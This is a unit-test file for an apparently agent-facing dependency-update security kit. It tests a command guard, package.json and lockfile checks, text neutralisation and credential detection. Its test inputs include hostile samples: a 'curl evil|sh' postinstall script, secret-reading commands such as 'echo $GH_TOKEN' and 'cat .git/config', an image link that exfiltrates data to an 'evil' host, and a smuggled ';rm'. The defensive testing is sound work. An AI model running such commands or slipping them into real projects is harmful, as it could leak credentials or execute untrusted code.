// Unit tests for the kit's pure checks and the command guard. Run: node test/unit.mjs
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { allowed } from "../tools/bash-guard.mjs";
import {
  isSemverRange, lowers, parseAlias, parseStrictJson, registryProblems, buildPackageJson, lockPackageNames, lockVersions, lockResolutions, lockDowngrades, compareVersions, openEnded, pnpmWorkspace, neutralise,
  pathProblems, patchShapeProblems, credentialProblems, cleanTitle,
} from "../tools/checks.mjs";
import { auditCounts, safeProblem } from "../tools/verify.mjs";
import { alertIds, taskIds, SECURITY_BRANCH, branchIssue } from "../tools/gate.mjs";

let n = 0;
const t = (name, fn) => { fn(); n++; };

t("guard allows the exact list", () => {
  process.env.SAFE_PM_DIRS = ". scripts/baseline";
  for (const c of ["safe-pm audit", "safe-pm lock", "safe-pm audit scripts/baseline", "safe-pm lock scripts/baseline",
    "git status", "git diff", "git diff --staged", "git log --oneline -20", "  git status  "]) assert.ok(allowed(c), c);
});
t("guard blocks everything else", () => {
  for (const c of ["echo $GH_TOKEN", "/usr/bin/grep -r AUTHORIZATION .", "grep -r x .", "git remote -v",
    "git config -l", "cat .git/config", "safe-pm audit; env", "safe-pm audit && cat .git/config",
    "safe-pm audit ../x", "safe-pm audit scripts", "safe-pm lock .  ", "git  status", "git status\nenv",
    "git diff --no-index .git/config /dev/null", "env", "printenv", "node -e 1", "npm ci", "bash -c 'git status'",
    "safe-pm audit $(cat .git/config)", "git log --oneline -20 --all", "", "safe-pr", "gh pr view"]) {
    if (c === "safe-pm lock .  ") { assert.ok(allowed(c)); continue; } // trimmed, same as "safe-pm lock ."
    assert.ok(!allowed(c), c);
  }
});

t("semver ranges only", () => {
  for (const v of ["1.2.3", "^1.2.3", "~1.2", ">=1.0.0 <2", ">= 1.0.0", "1.x", "*", "", "^1.0.0 || ^2.0.0", "1.0.0 - 2.0.0", "1.0.0-beta.1", "v1.2.3", "=1.2.3"]) assert.ok(isSemverRange(v), v);
  for (const v of ["latest", "next", "beta", "git+https://x/y.git", "github:a/b", "a/b", "file:../x", "link:x", "https://x/y.tgz",
    "workspace:*", "catalog:", "npm:a@1", null, 1, "1.2.3 evil"]) assert.ok(!isSemverRange(v), String(v));
});
t("aliases in any letter case", () => {
  assert.deepEqual(parseAlias("NPM:Is-Number@7.0.0"), { name: "is-number", range: "7.0.0" });
  assert.deepEqual(parseAlias("npm:@s/x@^1"), { name: "@s/x", range: "^1" });
  assert.equal(parseAlias("^1.0.0"), null);
});
t("repeated JSON keys are refused", () => {
  assert.throws(() => parseStrictJson('{"a":1,"a":2}'), /repeated key/);
  assert.throws(() => parseStrictJson('{"x":{"b":1,"b":1}}'), /repeated key/);
  assert.deepEqual(parseStrictJson('{"a":[1,{"b":"c\\\\ \\"q\\""}],"d":null}'), { a: [1, { b: 'c\\ "q"' }], d: null });
  assert.throws(() => parseStrictJson('{"a":1} x'));
});
t("registry problems for safe-pm", () => {
  assert.deepEqual(registryProblems({ dependencies: { a: "1.0.0", b: "npm:c@^1" }, overrides: { c: "$a", d: { e: "^2" } } }), []);
  assert.equal(registryProblems({ dependencies: { a: "latest" } }).length, 1);
  assert.equal(registryProblems({ overrides: { b: "github:x/y" } }).length, 1);
  assert.equal(registryProblems({ pnpm: { overrides: { b: "link:../x" } } }).length, 1);
});
const BASE = JSON.stringify({ name: "x", scripts: { build: "astro build" }, dependencies: { a: "1.0.0", sw: "npm:string-width@^4.2.0" }, devDependencies: { t: "^5.0.0" } }, null, 2) + "\n";
const lockNames = new Set(["a", "sw", "string-width", "t", "deep", "@s/deep"]);
const build = (next, pm = "npm") => buildPackageJson(BASE, typeof next === "string" ? next : JSON.stringify(next, null, 2) + "\n", { pm, lockNames });
const baseObj = JSON.parse(BASE);
t("package.json: allowed changes are rebuilt from the base text", () => {
  let r = build({ ...baseObj, dependencies: { ...baseObj.dependencies, a: "1.0.1" } });
  assert.deepEqual(r.problems, []);
  assert.ok(r.changed && r.text.includes('"a": "1.0.1"') && r.text.endsWith("}\n"));
  r = build({ ...baseObj, overrides: { deep: "2.0.1", "@s/deep@<1.2": "1.2.0", a: "$a" } });
  assert.deepEqual(r.problems, []);
  r = build({ ...baseObj, dependencies: { ...baseObj.dependencies, sw: "NPM:string-width@^4.2.3" } });
  assert.deepEqual(r.problems, []);
  r = build({ ...baseObj, pnpm: { overrides: { "a>deep": "2.0.1" } } }, "pnpm");
  assert.deepEqual(r.problems, []);
  r = build(BASE.replace("{\n", "{ \n"));
  assert.deepEqual(r.problems, []); assert.equal(r.changed, false);
});
t("package.json: refused changes", () => {
  const cases = {
    "a postinstall script": { ...baseObj, scripts: { ...baseObj.scripts, postinstall: "curl evil|sh" } },
    "an added dependency": { ...baseObj, dependencies: { ...baseObj.dependencies, evil: "1.0.0" } },
    "a removed dependency": { ...baseObj, dependencies: { a: "1.0.0" } },
    "a new alias in capitals": { ...baseObj, dependencies: { ...baseObj.dependencies, a: "NPM:is-number@7.0.0" } },
    "an alias pointed elsewhere": { ...baseObj, dependencies: { ...baseObj.dependencies, sw: "npm:evil@^4.2.0" } },
    "a dist-tag": { ...baseObj, dependencies: { ...baseObj.dependencies, a: "latest" } },
    "a git dependency": { ...baseObj, dependencies: { ...baseObj.dependencies, a: "github:evil/evil" } },
    "an override for an unknown package": { ...baseObj, overrides: { evil: "1.0.0" } },
    "an alias override": { ...baseObj, overrides: { a: "npm:evil@1.0.0" } },
    "a URL override": { ...baseObj, overrides: { a: "https://evil/x.tgz" } },
    "a new field": { ...baseObj, bin: { x: "y" } },
    "a packageManager change": { ...baseObj, packageManager: "npm@1.0.0" },
  };
  for (const [name, next] of Object.entries(cases)) assert.ok(build(next).problems.length > 0, name);
  const dup = BASE.replace('"scripts": {', '"scripts": { "postinstall": "evil" },\n  "scripts": {');
  assert.match(build(dup).problems.join(" "), /repeated key/);
  assert.ok(build({ ...baseObj, pnpm: { overrides: { evil: "1.0.0" } } }, "pnpm").problems.length > 0);
});
t("downgrades are refused", () => {
  assert.ok(lowers("^4.18.1", "4.17.21") && lowers("1.2.6", "1.2.5") && lowers("^5.0.0", "^4.9.9"));
  assert.ok(!lowers("4.17.20", "4.17.21") && !lowers("^4.17.20", "^4.18.0") && !lowers("~1.2", "1.2.0") && !lowers("*", "1.0.0"));
  assert.match(build({ ...baseObj, dependencies: { ...baseObj.dependencies, a: "0.9.9" } }).problems.join(" "), /lowers the version/);
  assert.match(build({ ...baseObj, dependencies: { ...baseObj.dependencies, sw: "npm:string-width@^4.1.0" } }).problems.join(" "), /lowers the version/);
});
t("package.json: a project with a source outside the registry is out of scope", () => {
  for (const src of ["github:acme/a", "git+https://example.com/a.git", "file:../a", "workspace:*", "https://example.com/a.tgz", "acme/a", "latest"]) {
    for (const base of [{ name: "x", dependencies: { a: src, t: "1.0.0" } }, { name: "x", dependencies: { t: "1.0.0" }, overrides: { deep: src } }]) {
      const text = JSON.stringify(base, null, 2) + "\n";
      const go = (next) => buildPackageJson(text, JSON.stringify(next, null, 2) + "\n", { pm: "npm", lockNames });
      assert.match(go({ ...base, dependencies: { ...base.dependencies, t: "1.0.1" } }).problems.join(" "), /not an npm registry version/, src);
      assert.match(go({ ...base, dependencies: { ...base.dependencies, a: "1.2.3" }, overrides: { deep: "2.0.0" } }).problems.join(" "), /not an npm registry version/, src);
    }
  }
});
t("package.json: a new range must have an upper limit", () => {
  for (const r of ["*", "", "x", ">=1.0.1", ">1", ">=1.0.1 || ^2.0.0", ">= 1.0.1"]) assert.ok(openEnded(r), r);
  for (const r of ["1.0.1", "^1.0.1", "~1.0.1", ">=1.0.1 <2.0.0", "1.0.1 - 1.9.0", "1.x", "^1.0.1 || ^2.0.0", "<=1.5.0"]) assert.ok(!openEnded(r), r);
  assert.match(build({ ...baseObj, dependencies: { ...baseObj.dependencies, a: "*" } }).problems.join(" "), /no upper limit/);
  assert.match(build({ ...baseObj, dependencies: { ...baseObj.dependencies, a: ">=1.0.1" } }).problems.join(" "), /no upper limit/);
  assert.match(build({ ...baseObj, dependencies: { ...baseObj.dependencies, sw: "npm:string-width@>=4.2.3" } }).problems.join(" "), /no upper limit/);
  assert.match(build({ ...baseObj, overrides: { deep: "*" } }).problems.join(" "), /no upper limit/);
  assert.match(build({ ...baseObj, pnpm: { overrides: { deep: ">=2.0.0" } } }, "pnpm").problems.join(" "), /no upper limit/);
});
t("package.json: an override may not go down", () => {
  const base = JSON.stringify({ name: "x", dependencies: { a: "1.0.0" }, overrides: { deep: "4.0.0", a: { deep: "^2.1.0" } } }, null, 2) + "\n";
  const go = (ov, pm = "npm") => buildPackageJson(base, JSON.stringify({ ...JSON.parse(base), overrides: ov }, null, 2) + "\n", { pm, lockNames });
  assert.match(go({ deep: "3.0.0", a: { deep: "^2.1.0" } }).problems.join(" "), /lowers the version/);
  assert.match(go({ deep: "4.0.0", a: { deep: "^2.0.0" } }).problems.join(" "), /lowers the version/);
  assert.deepEqual(go({ deep: "4.0.1", a: { deep: "^2.1.0" } }).problems, []);
  const pbase = JSON.stringify({ name: "x", dependencies: { a: "1.0.0" }, pnpm: { overrides: { deep: "4.0.0" } } }, null, 2) + "\n";
  const r = buildPackageJson(pbase, JSON.stringify({ ...JSON.parse(pbase), pnpm: { overrides: { deep: "3.9.9" } } }, null, 2) + "\n", { pm: "pnpm", lockNames });
  assert.match(r.problems.join(" "), /lowers the version/);
});
t("lockfiles: no package may resolve to an older version", () => {
  const npm = (vs) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version: vs[0] }, "node_modules/x/node_modules/a": { version: vs[1] }, "node_modules/l": { link: true, resolved: "x" } } });
  assert.deepEqual([...lockVersions("npm", npm(["2.0.0", "1.0.0"])).get("a")].sort(), ["1.0.0", "2.0.0"]);
  assert.deepEqual(lockDowngrades("npm", npm(["2.0.0", "1.0.0"]), npm(["2.0.1", "1.0.0"])), []);
  assert.equal(lockDowngrades("npm", npm(["2.0.0", "1.0.0"]), npm(["1.9.0", "1.0.0"])).length, 1);
  assert.equal(lockDowngrades("npm", npm(["2.0.0", "1.0.0"]), npm(["2.0.0", "0.9.0"])).length, 1);
  assert.equal(lockDowngrades("npm", npm(["2.0.0", "2.0.0"]), npm(["2.0.0-rc.1", "2.0.0"])).length, 1);
  const v1 = (v) => JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: v, dependencies: { b: { version: "1.0.0" } } } } });
  assert.equal(lockDowngrades("npm", v1("2.0.0"), v1("1.0.0")).length, 1);
  assert.deepEqual(lockDowngrades("npm", v1("2.0.0"), v1("2.1.0")), []);
  const pnpm = (v) => `lockfileVersion: '9.0'\npackages:\n\n  '@s/b@${v}':\n    resolution: {integrity: sha512-x}\n\n  a@2.0.0(react@19.0.0):\n    resolution: {integrity: sha512-y}\n`;
  assert.deepEqual([...lockVersions("pnpm", pnpm("1.5.0")).keys()].sort(), ["@s/b", "a"]);
  assert.equal(lockDowngrades("pnpm", pnpm("1.5.0"), pnpm("1.4.9")).length, 1);
  assert.deepEqual(lockDowngrades("pnpm", pnpm("1.5.0"), pnpm("1.5.1")), []);
  const p6 = (v) => `lockfileVersion: '6.0'\npackages:\n\n  /a@${v}(react@18.0.0):\n    dev: false\n`;
  const p5 = (v) => `lockfileVersion: 5.4\npackages:\n\n  /a/${v}_react@18.0.0:\n    dev: false\n`;
  for (const f of [p6, p5]) { assert.equal(lockDowngrades("pnpm", f("3.0.0"), f("2.0.0")).length, 1); assert.deepEqual(lockDowngrades("pnpm", f("3.0.0"), f("3.0.0")), []); }
  const bun = (v) => `{\n  "packages": {\n    "a": ["a@${v}", "", {}, "sha512-x"],\n    "@s/b": ["@s/b@2.0.0", "", {}, "sha512-y"],\n  },\n}\n`;
  assert.equal(lockDowngrades("bun", bun("1.5.0"), bun("1.4.0")).length, 1);
  assert.deepEqual(lockDowngrades("bun", bun("1.5.0"), bun("1.5.0")), []);
  // One copy goes down while another goes up: the set of versions hides it, the places do not.
  const swap = (top, nested) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version: top }, "node_modules/x/node_modules/a": { version: nested } } });
  assert.equal(lockDowngrades("npm", swap("2.0.0", "1.0.0"), swap("1.0.0", "3.0.0")).length, 1);
  const v1swap = (top, nested) => JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: top }, x: { version: "1.0.0", dependencies: { a: { version: nested } } } } });
  assert.equal(lockDowngrades("npm", v1swap("2.0.0", "1.0.0"), v1swap("1.0.0", "3.0.0")).length, 1);
  const bswap = (top, nested) => `{\n  "packages": {\n    "a": ["a@${top}", "", {}, "sha512-x"],\n    "x/a": ["a@${nested}", "", {}, "sha512-y"],\n  },\n}\n`;
  assert.equal(lockDowngrades("bun", bswap("2.0.0", "1.0.0"), bswap("1.0.0", "3.0.0")).length, 1);
  assert.deepEqual(lockDowngrades("bun", bswap("2.0.0", "1.0.0"), bswap("2.0.1", "1.0.0")), []);
  const p9 = (direct, other) => `lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      a:\n        specifier: ^1.0.0\n        version: ${direct}(react@19.0.0)\n      '@s/b':\n        specifier: 1.0.0\n        version: 1.0.0\n\npackages:\n\n  a@${direct}:\n    resolution: {integrity: sha512-x}\n\n  a@${other}:\n    resolution: {integrity: sha512-y}\n\n  '@s/b@1.0.0':\n    resolution: {integrity: sha512-z}\n`;
  assert.equal(lockResolutions("pnpm", p9("2.0.0", "1.0.0")).get(".|a"), "2.0.0");
  assert.equal(lockResolutions("pnpm", p9("2.0.0", "1.0.0")).get(".|@s/b"), "1.0.0");
  assert.equal(lockDowngrades("pnpm", p9("2.0.0", "1.0.0"), p9("1.0.0", "3.0.0")).length, 1);
  assert.deepEqual(lockDowngrades("pnpm", p9("2.0.0", "1.0.0"), p9("2.0.1", "1.0.0")), []);
  // Two aliases of one package: one goes down while the other goes up.
  const pal = (x, y) => `lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      one:\n        specifier: npm:foo@>=1 <3\n        version: foo@${x}\n      two:\n        specifier: npm:foo@^1\n        version: foo@${y}(react@19.0.0)\n\npackages:\n\n  foo@${x}:\n    resolution: {integrity: sha512-x}\n\n  foo@${y}:\n    resolution: {integrity: sha512-y}\n`;
  assert.equal(lockResolutions("pnpm", pal("2.0.0", "1.0.0")).get(".|one"), "2.0.0");
  assert.equal(lockResolutions("pnpm", pal("2.0.0", "1.0.0")).get(".|two"), "1.0.0");
  assert.equal(lockDowngrades("pnpm", pal("2.0.0", "1.0.0"), pal("1.0.0", "3.0.0")).length, 1);
  const pal6 = (x) => `lockfileVersion: '6.0'\n\ndependencies:\n  one:\n    specifier: npm:foo@^1\n    version: /foo@${x}\n`;
  const pal5 = (x) => `lockfileVersion: 5.4\n\ndependencies:\n  one: /foo/${x}_react@18.0.0\n`;
  for (const f of [pal6, pal5]) { assert.equal(lockResolutions("pnpm", f("2.0.0")).get(".|one"), "2.0.0"); assert.equal(lockDowngrades("pnpm", f("2.0.0"), f("1.9.0")).length, 1); }
  const p5d = (v) => `lockfileVersion: 5.4\n\nspecifiers:\n  a: ^1.0.0\n\ndependencies:\n  a: ${v}\n\npackages:\n\n  /a/${v}:\n    dev: false\n\n  /a/9.0.0:\n    dev: false\n`;
  assert.equal(lockResolutions("pnpm", p5d("2.0.0")).get(".|a"), "2.0.0");
  assert.equal(lockDowngrades("pnpm", p5d("2.0.0"), p5d("1.0.0")).length, 1);
  assert.ok(compareVersions("1.0.0-alpha.2", "1.0.0-alpha.10") < 0 && compareVersions("1.0.0-rc.1", "1.0.0") < 0 && compareVersions("1.10.0", "1.9.0") > 0);
});
t("audit output must look like a real audit result", () => {
  const ok = { metadata: { vulnerabilities: { info: 0, low: 1, moderate: 2, high: 3, critical: 4, total: 10 } } };
  assert.deepEqual(auditCounts("npm", ok), { critical: 4, high: 3, moderate: 2, low: 1 });
  assert.deepEqual(auditCounts("pnpm", ok), { critical: 4, high: 3, moderate: 2, low: 1 });
  for (const bad of [null, [], {}, { error: { code: "ENOTFOUND", summary: "x" } }, { message: "request failed", error: "x" },
    { metadata: {} }, { metadata: { vulnerabilities: { low: 0, moderate: 0, high: 0 } } }, { metadata: { vulnerabilities: { low: "0", moderate: 0, high: 0, critical: 0 } } },
    { ...ok, error: { code: "E500" } }]) {
    assert.equal(auditCounts("npm", bad), null, JSON.stringify(bad));
    assert.equal(auditCounts("pnpm", bad), null, JSON.stringify(bad));
  }
  assert.deepEqual(auditCounts("bun", {}), { critical: 0, high: 0, moderate: 0, low: 0 });
  assert.deepEqual(auditCounts("bun", { lodash: [{ id: 1, severity: "high" }, { id: 2, severity: "critical" }], other: [{ id: 1, severity: "high" }] }),
    { critical: 1, high: 1, moderate: 0, low: 0 });
  for (const bad of [null, [], { error: "fetch failed" }, { message: "x" }, { lodash: "x" }, { lodash: [{ severity: "high" }] }, { lodash: [{ id: 1 }] }]) {
    assert.equal(auditCounts("bun", bad), null, JSON.stringify(bad));
  }
});
t("lockfile package names", () => {
  const npm = JSON.stringify({ packages: { "": {}, "node_modules/a": {}, "node_modules/x/node_modules/@s/b": {}, "node_modules/sw": { name: "string-width" } } });
  assert.deepEqual([...lockPackageNames("npm", npm)].sort(), ["@s/b", "a", "string-width", "sw"]);
  const npm1 = JSON.stringify({ lockfileVersion: 1, dependencies: { a: { version: "1.0.0", dependencies: { "@s/b": { version: "2.0.0" } } } } });
  assert.deepEqual([...lockPackageNames("npm", npm1)].sort(), ["@s/b", "a"]);
  const pnpm = "lockfileVersion: '9.0'\npackages:\n\n  '@s/b@1.0.0':\n    resolution: {integrity: sha512-x}\n\n  a@2.0.0(react@19.0.0):\n    resolution: {integrity: sha512-y}\n";
  assert.deepEqual([...lockPackageNames("pnpm", pnpm)].sort(), ["@s/b", "a"]);
  const old6 = "lockfileVersion: '6.0'\npackages:\n\n  /@s/b@1.0.0:\n    resolution: {integrity: sha512-x}\n\n  /a@2.0.0(react@18.0.0):\n    dev: false\n";
  assert.deepEqual([...lockPackageNames("pnpm", old6)].sort(), ["@s/b", "a"]);
  const old5 = "lockfileVersion: 5.4\npackages:\n\n  /@s/b/1.0.0:\n    dev: false\n\n  /a/2.0.0_react@18.0.0:\n    dev: false\n";
  assert.deepEqual([...lockPackageNames("pnpm", old5)].sort(), ["@s/b", "a"]);
  const bun = '{\n  "packages": {\n    "a": ["a@1.0.0", "", {}, "sha512-x"],\n    "@s/b": ["@s/b@2.0.0", "", {}, "sha512-y"],\n  },\n}\n';
  assert.ok(["a", "@s/b"].every((n) => lockPackageNames("bun", bun).has(n)));
});
t("published text is neutralised", () => {
  const n = neutralise("Fixes #12, closes owner/repo#3, resolves https://github.com/o/r/issues/4. Hi @someone ![x](https://evil/p.png) <img src=x>");
  assert.ok(!/#12|#3|issues\/4/.test(n), n);
  assert.ok(!/@someone/.test(n) && n.includes("@\u200bsomeone"));
  assert.ok(!n.includes("evil/p.png") && !n.includes("<img"));
  const r = neutralise("See ![x][leak] and ![leak] and !![y][leak]\n\n[leak]: https://evil/p.png?d=abc\n");
  assert.ok(!r.includes("!["), r);
});
t("problems posted in a comment are cleaned", () => {
  const p = safeProblem('package.json: the key "![x](https://evil/p.png?d=abc)" appears twice. cc @someone ![y][r] <img src=x> fixes #3');
  assert.ok(!p.includes("![") && !p.includes("evil/p.png") && !p.includes("<img") && !/@someone/.test(p) && !/#3/.test(p), p);
  assert.ok(/^[\x20-\x7e]*$/.test(p));
});
t("a pnpm workspace file that lists packages is spotted", () => {
  assert.ok(pnpmWorkspace("packages:\n  - 'apps/*'\n"));
  assert.ok(pnpmWorkspace("onlyBuiltDependencies:\n  - esbuild\npackages :\n  - a\n"));
  assert.ok(!pnpmWorkspace("onlyBuiltDependencies:\n  - esbuild\n"));
  assert.ok(!pnpmWorkspace(""));
});
t("paths", () => {
  const o = { pm: "npm", projectDirs: [".", "scripts/baseline"], codePaths: ["src/"], protectedPaths: ["src/content/"] };
  assert.deepEqual(pathProblems(["package.json", "package-lock.json", "scripts/baseline/package.json", "src/lib/a.ts"], o), []);
  for (const p of [".github/workflows/ci.yml", ".npmrc", "src/.npmrc", "netlify.toml", "netlify/functions/x.ts",
    "CLAUDE.md", "src/content/page.md", "scripts/run.sh", "bun.lock", "npm-shrinkwrap.json", "src/../.npmrc",
    ".nvmrc", "README.md", "src/a b.ts", "supabase/x.sql", ".claude/settings.json", "src-x/a.ts", ".mcp.json", "patches/a.patch"]) {
    assert.equal(pathProblems([p], o).length, 1, p);
  }
  assert.equal(pathProblems(["src/a.ts"], { ...o, codePaths: [] }).length, 1);
  // A path the repository protects stays protected, even if it is a dependency file.
  assert.equal(pathProblems(["scripts/baseline/package.json"], { ...o, protectedPaths: ["scripts/baseline/package.json"] }).length, 1);
  assert.equal(pathProblems(["scripts/baseline/package-lock.json"], { ...o, protectedPaths: ["scripts/baseline/"] }).length, 1);
  // A protected folder named without the last "/" still covers what is inside it.
  assert.equal(pathProblems(["src/generated/a.js"], { ...o, codePaths: ["src"], protectedPaths: ["src/generated"] }).length, 1);
  assert.deepEqual(pathProblems(["src/generated2/a.js"], { ...o, codePaths: ["src"], protectedPaths: ["src/generated"] }), []);
});
t("patch shape", () => {
  assert.deepEqual(patchShapeProblems("1\t1\tpackage.json\n3\t2\tpackage-lock.json\n"), { bad: [], paths: ["package.json", "package-lock.json"] });
  for (const s of ["-\t-\tlogo.png\n", "1\t0\tnew.js\n create mode 100644 new.js\n", "0\t1\told.js\n delete mode 100644 old.js\n",
    "0\t0\ta.js\n mode change 100644 => 100755 a.js\n", "1\t0\tlink\n create mode 120000 link\n", "0\t0\t{a => b}.js\n rename a.js => b.js (100%)\n"]) {
    assert.ok(patchShapeProblems(s).bad.length > 0, s);
  }
});
t("credentials", () => {
  for (const s of ["ghs_abcdefghijklmnopqrstuvwxyz0123", "github_pat_11ABCDEFG0123456789_abc", "https://x-access-token:abc@github.com",
    "AUTHORIZATION: basic eDp5", "sk-ant-oat01-abcdefghijkl", "-----BEGIN OPENSSH PRIVATE KEY-----", "npm_abcdefghijklmnopqrstuvwxyz0123456789"]) {
    assert.equal(credentialProblems(s, "x").length, 1, s);
  }
  assert.deepEqual(credentialProblems("Bumped vite from 5.4.1 to 5.4.21 (GHSA-64vr-g452-qvp3).", "x"), []);
});
t("title", () => {
  assert.equal(cleanTitle("security: bump vite\nmore"), "bump vite");
  assert.equal(cleanTitle("x‮\u0007y"), "xy");
  assert.equal(cleanTitle("a".repeat(300)).length, 100);
});
t("alert ids", () => {
  assert.deepEqual(alertIds("Fix GHSA-64VR-G452-QVP3 and cve-2024-12345, GHSA-64vr-g452-qvp3 again"), ["GHSA-64vr-g452-qvp3", "CVE-2024-12345"]);
  assert.deepEqual(alertIds("GHSA-aaaa-bbbb-cccc is not a real id"), []);
  assert.deepEqual(alertIds("nothing"), []);
});
t("task ids and branches", () => {
  assert.deepEqual(taskIds("13591917438 INF-24 Fix open security alerts"), { task: "13591917438", record: "INF-24" });
  assert.equal(taskIds("Fix open security alerts"), null);
  for (const b of ["security/issue-12-123456", "13591917438-INF-24-security-issue-87-123456"]) assert.ok(SECURITY_BRANCH.test(b), b);
  for (const b of ["main", "security/../main", "security/issue-1", "feature/x", "security/issue-12-1;rm"]) assert.ok(!SECURITY_BRANCH.test(b), b);
  assert.equal(branchIssue("security/issue-12-123456"), 12);
  assert.equal(branchIssue("13591917438-INF-24-security-issue-87-123456"), 87);
});
t("guard as a hook process", () => {
  const run = (cmd) => {
    try {
      execFileSync("node", [new URL("../tools/bash-guard.mjs", import.meta.url).pathname], {
        input: JSON.stringify({ tool_name: "Bash", tool_input: { command: cmd } }), stdio: ["pipe", "ignore", "ignore"],
        env: { ...process.env, SAFE_PM_DIRS: "." },
      });
      return 0;
    } catch (e) { return e.status; }
  };
  assert.equal(run("git status"), 0);
  assert.equal(run("cat .git/config"), 2);
  const ps = (() => { try { execFileSync("node", [new URL("../tools/bash-guard.mjs", import.meta.url).pathname], { input: JSON.stringify({ tool_name: "PowerShell", tool_input: { command: "Get-Content .git/config" } }), stdio: ["pipe", "ignore", "ignore"] }); return 0; } catch (e) { return e.status; } })();
  assert.equal(ps, 2);
  const other = execFileSync("node", [new URL("../tools/bash-guard.mjs", import.meta.url).pathname], {
    input: JSON.stringify({ tool_name: "Read", tool_input: {} }) });
  assert.equal(String(other), "");
});
console.log(`${n} unit test groups passed`);
